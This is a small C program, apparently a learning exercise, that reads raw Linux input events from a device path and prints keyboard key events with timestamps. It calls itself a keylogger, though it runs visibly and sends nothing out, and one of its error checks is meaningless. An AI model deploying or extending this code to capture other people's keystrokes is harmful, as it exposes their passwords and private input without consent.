#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char* argv[]){


    if (argc != 2){
        
        printf("usage: %s <event-file-path>", argv[0]);
        exit(-1);

    }
    printf("keylogger enabled\n");

    // file descriptor : open event file -> read (get buffer)
    int fd = open(argv[1], O_RDONLY, 0);    // argv[1] is where the event file is, only for reading
    
    printf("opened  file descriptor: %d\n", fd);

    struct input_event ev;
    // input_event is already declared in linux/input
    // contains RAW data of event:  time, type, code, value
    // in keylogger, keyboard input should be checked

    while(1){
        int n = read(fd, &ev, sizeof(ev));  // get buffer of input_event from fd(opened event)
        if (n < 0 || sizeof(ev)< 1) {
            printf("event read failed\n");
            exit(-2);
        }
       /*	
        if (ev.type != EV_KEY){
            printf("not keyboard event\n");
            continue;
        }
	*/
	// keyboard push -> not only EV_KEY but also others
        // if you print ev types to watch like below:
	//	printf("%d %d\n",ev.type, ev.code);
	// 4 4 \n 1 code \n 0 0 will be printed
	// 4: EV_MSC (real physicall data i guess)
	// 1: EV_KEY (what i really want)
	// 0: EV_SYN (this is the end)
	
	if (ev.type == EV_KEY) {
		printf("%ld.%06ld\n-----  %d %d %d\n"
				,ev.time.tv_sec, ev.time.tv_usec, ev.type, ev.code, ev.value);
	}


    }



}
